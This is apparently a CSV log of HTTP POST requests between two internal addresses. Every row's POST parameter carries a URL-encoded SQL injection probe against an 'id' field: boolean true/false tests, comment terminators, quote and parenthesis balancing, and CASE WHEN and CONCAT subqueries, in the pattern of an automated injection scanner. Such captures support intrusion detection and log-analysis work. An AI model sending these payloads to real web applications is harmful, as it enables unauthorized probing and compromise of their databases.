srcAddress,srcPort,destAddress,destPort,requestMethod,host,getParam,postParam
10.21.221.89,53898,10.122.255.147,80,POST,10.122.255.147,,id%3d1%29%20AND%202050%3D2050%20AND%20%287238%3D7238
10.21.221.89,53900,10.122.255.147,80,POST,10.122.255.147,,id%3d1%29%20AND%202999%3D7805%20AND%20%283154%3D3154
10.21.221.89,53902,10.122.255.147,80,POST,10.122.255.147,,id%3d1%20AND%205951%3D2181
10.21.221.89,53904,10.122.255.147,80,POST,10.122.255.147,,id%3d1%20AND%202050%3D2050
10.21.221.89,53906,10.122.255.147,80,POST,10.122.255.147,,id%3d1%20AND%202190%3D9417
10.21.221.89,53908,10.122.255.147,80,POST,10.122.255.147,,id%3d1%20AND%205738%3D2037--%20FnUi
10.21.221.89,53910,10.122.255.147,80,POST,10.122.255.147,,id%3d1%20AND%202050%3D2050--%20OxWV
10.21.221.89,53912,10.122.255.147,80,POST,10.122.255.147,,id%3d1%20AND%204290%3D3202--%20OQHD
10.21.221.89,53916,10.122.255.147,80,POST,10.122.255.147,,id%3d1%27%29%20AND%204742%3D2557%20AND%20%28%27eQdW%27%3D%27eQdW
10.21.221.89,53918,10.122.255.147,80,POST,10.122.255.147,,id%3d1%27%29%20AND%202050%3D2050%20AND%20%28%27JKHk%27%3D%27JKHk
10.21.221.89,53920,10.122.255.147,80,POST,10.122.255.147,,id%3d1%27%29%20AND%208332%3D5207%20AND%20%28%27EkgU%27%3D%27EkgU
10.21.221.89,53922,10.122.255.147,80,POST,10.122.255.147,,id%3d1%27%20AND%203291%3D2727%20AND%20%27SNWt%27%3D%27SNWt
10.21.221.89,53924,10.122.255.147,80,POST,10.122.255.147,,id%3d1%27%20AND%202050%3D2050%20AND%20%27oera%27%3D%27oera
10.21.221.89,53930,10.122.255.147,80,POST,10.122.255.147,,id%3d1%27%20AND%203829%3D5772%20AND%20%27DKDj%27%3D%27DKDj
10.21.221.89,53932,10.122.255.147,80,POST,10.122.255.147,,id%3d%28SELECT%20%28CASE%20WHEN%20%286290%3D3030%29%20THEN%201%20ELSE%20%28SELECT%203030%20UNION%20SELECT%205856%29%20END%29%29
10.21.221.89,53934,10.122.255.147,80,POST,10.122.255.147,,id%3d%28SELECT%20%28CASE%20WHEN%20%289723%3D9723%29%20THEN%201%20ELSE%20%28SELECT%204936%20UNION%20SELECT%202811%29%20END%29%29
10.21.221.89,53936,10.122.255.147,80,POST,10.122.255.147,,id%3d%28SELECT%20%28CASE%20WHEN%20%289889%3D7649%29%20THEN%201%20ELSE%20%28SELECT%207649%20UNION%20SELECT%204329%29%20END%29%29
10.21.221.89,53938,10.122.255.147,80,POST,10.122.255.147,,id%3d%28SELECT%20CONCAT%28CONCAT%280x716a766b71%2C%28CASE%20WHEN%20%285328%3D5328%29%20THEN%200x31%20ELSE%200x30%20END%29%29%2C0x71626b7671%29%29
10.21.221.89,53940,10.122.255.147,80,POST,10.122.255.147,,id%3d1%29%20AND%201748%3D2935%23
10.21.221.89,53942,10.122.255.147,80,POST,10.122.255.147,,id%3d1%29%20AND%205813%3D5813%23
10.21.221.89,53944,10.122.255.147,80,POST,10.122.255.147,,id%3d1%29%20AND%208754%3D4738%23
10.21.221.89,53946,10.122.255.147,80,POST,10.122.255.147,,id%3d1%29%29%20AND%201155%3D4749%23
10.21.221.89,53948,10.122.255.147,80,POST,10.122.255.147,,id%3d1%29%29%20AND%205813%3D5813%23
10.21.221.89,53950,10.122.255.147,80,POST,10.122.255.147,,id%3d1%29%29%20AND%204108%3D1183%23
10.21.221.89,53952,10.122.255.147,80,POST,10.122.255.147,,id%3d1%29%29%29%20AND%202284%3D1158%23
10.21.221.89,53954,10.122.255.147,80,POST,10.122.255.147,,id%3d1%29%29%29%20AND%205813%3D5813%23
